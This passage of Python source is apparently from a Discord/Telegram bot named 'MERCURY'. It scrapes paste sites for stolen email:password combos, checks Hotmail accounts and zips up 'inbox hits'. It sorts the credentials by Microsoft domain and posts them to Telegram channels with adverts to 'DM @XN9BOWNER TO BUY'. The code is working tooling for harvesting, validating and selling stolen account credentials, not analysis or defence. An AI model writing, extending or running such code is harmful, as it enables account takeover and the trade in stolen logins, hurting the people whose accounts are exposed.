                                        log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
                                except Exception as e:
                                    log.error(f"Hotmail checker failed: {e}")

                            # Post sorted domains ZIP (hotmail only)
                            if label == "hotmail":
                                try:
                                    domain_map = {}
                                    for combo in all_raw:
                                        try:
                                            domain = combo.split(":", 1)[0].split("@")[-1].lower()
                                            if domain in MS_DOMAINS:
                                                domain_map.setdefault(domain, []).append(combo)
                                        except Exception:
                                            pass
                                    if domain_map:
                                        zip_buf = io.BytesIO()
                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                                            for domain, combos in domain_map.items():
                                                zf.writestr(f"{domain}.txt", "\n".join(combos))
                                        zip_buf.seek(0)
                                        zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
                                        await send_telegram_file(zip_buf.read(), zip_name)
                                        log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
                                except Exception as e:
                                    log.error(f"Failed to post domains ZIP: {e}")

                            if toggles["telegram_public"]:
                                private_post_count_ref = globals()
                                private_post_count_ref["private_post_count"] += 1
                                for chunk in chunks:
                                    private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt")
                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                if private_post_count_ref["private_post_count"] >= 2:
                                    private_post_count_ref["private_post_count"] = 0
                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
                                    private_post_count_ref["recent_filenames"] = []
                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                    promo_path = os.path.join("/app", "promo.png")
                                    async with aiohttp.ClientSession() as sess:
                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
                                            try:
                                                if os.path.exists(promo_path):
                                                    form = aiohttp.FormData()
                                                    form.add_field("chat_id", pub_chat)
                                                    form.add_field("caption", pub_text)
                                                    with open(promo_path, "rb") as img:
                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendPhoto failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update with image to {pub_chat}")
                                                else:
                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                                        json={"chat_id": pub_chat, "text": pub_text})
                                                    body = await resp.json()
                                                    if not body.get("ok"):
                                                        log.error(f"Telegram sendMessage failed: {body}")
                                                    else:
                                                        log.info(f"Posted public update to {pub_chat}")
                                            except Exception as e:
                                                log.error(f"Failed to post public update to {pub_chat}: {e}")


                    else:
                        log.info("Nothing to post to content channel")

                except Exception as e:
                    log.error(f"Could not post to content channel: {e}")

            except Exception as e:
                log.error(f"Monitor loop error: {e}")
                stats["empty_scans"] += 1
            finally:
                await browser.close()


@monitor_loop.before_loop
async def before_monitor():
    await bot.wait_until_ready()


@tasks.loop(seconds=60)
async def watchdog():
    """Restart monitor loop if it dies."""
    if not monitor_loop.is_running():
        log.warning("Monitor loop was dead, restarting...")
        monitor_loop.start()


@watchdog.before_loop
async def before_watchdog():
    await bot.wait_until_ready()

# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
@tree.command(name="scrape", description="Manually trigger a scrape right now")
@app_commands.describe(pages="Number of archive pages to scan (default: 5)")
async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
    await monitor_loop()
    await interaction.followup.send("✅ Done.", ephemeral=True)


@tree.command(name="toggle", description="Enable or disable a bot feature")
@app_commands.describe(feature="Feature to toggle")
@app_commands.choices(feature=[
    app_commands.Choice(name="scanning",        value="scanning"),
    app_commands.Choice(name="telegram",        value="telegram"),
    app_commands.Choice(name="telegram_public", value="telegram_public"),
    app_commands.Choice(name="owner_dm",        value="owner_dm"),
])
async def cmd_toggle(interaction: discord.Interaction, feature: str):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
        return
    toggles[feature] = not toggles[feature]
    state = "✅ ON" if toggles[feature] else "❌ OFF"
    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)


@tree.command(name="toggles", description="Show current status of all toggles")
async def cmd_toggles(interaction: discord.Interaction):
    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
    await interaction.response.send_message("\n".join(lines), ephemeral=True)



@tree.command(name="stats", description="Show bot stats")
async def cmd_stats(interaction: discord.Interaction):
    uptime_secs      = int(time.time() - start_time)
    hours, remainder = divmod(uptime_secs, 3600)
    minutes, seconds = divmod(remainder, 60)
    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
    await interaction.response.send_message(embed=embed)

# ─── EVENTS ──────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await tree.sync()
        log.info(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        log.error(f"Failed to sync commands: {e}")

    # Delete Telegram webhook so it doesnt process channel messages
    try:
        async with aiohttp.ClientSession() as sess:
            await sess.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true")
            log.info("Telegram webhook cleared")
    except Exception as e:
        log.error(f"Failed to clear Telegram webhook: {e}")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
    else:
        log.info("Monitor already running after reconnect")
    if not watchdog.is_running():
        watchdog.start()

@bot.event
async def on_resumed():
    log.info("Discord session resumed")
    if not monitor_loop.is_running():
        monitor_loop.start()
        log.info("Monitor restarted after resume")
    if not watchdog.is_running():
        watchdog.start()

# ─── RUN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    bot.run(DISCORD_TOKEN, log_handler=None)
